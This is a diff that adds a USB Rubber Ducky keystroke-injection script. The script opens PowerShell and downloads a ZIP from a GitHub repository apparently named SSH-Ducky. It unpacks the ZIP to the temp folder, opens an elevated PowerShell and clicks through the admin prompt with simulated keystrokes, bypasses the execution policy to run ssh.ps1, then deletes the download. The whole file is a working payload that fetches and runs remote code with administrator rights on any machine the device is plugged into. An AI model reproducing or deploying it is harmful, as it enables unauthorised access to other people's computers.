@@ -1,0 +1,52 @@
+REM Place this code in the Rubber Ducky script
+
+REM Delay for initial setup
+DELAY 5000
+
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Download the ZIP file
+STRING Invoke-WebRequest -Uri "https://github.com/ToxySecurity/SSH-Ducky/archive/refs/heads/main.zip" -OutFile "$env:TEMP\repo.zip" -UseBasicParsing
+ENTER
+DELAY 5000
+
+REM Extract the ZIP file with -Force parameter
+STRING Expand-Archive -Path "$env:TEMP\repo.zip" -DestinationPath "$env:TEMP\repo" -Force
+ENTER
+DELAY 2000
+
+REM Open PowerShell as administrator
+REM Modify the path if necessary
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+
+REM Navigate to the extracted repository folder
+STRING cd "$env:TEMP\repo\SSH-Ducky-main"
+ENTER
+DELAY 1000
+
+STRING powershell -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; .\ssh.ps1"
+ENTER
+DELAY 5000
+
+REM Cleanup temporary files
+STRING Remove-Item "$env:TEMP\repo.zip" -Force
+ENTER
+
+REM Close PowerShell
+REM STRING exit
+REM ENTER
+
+REM Delay for script completion
+DELAY 1000
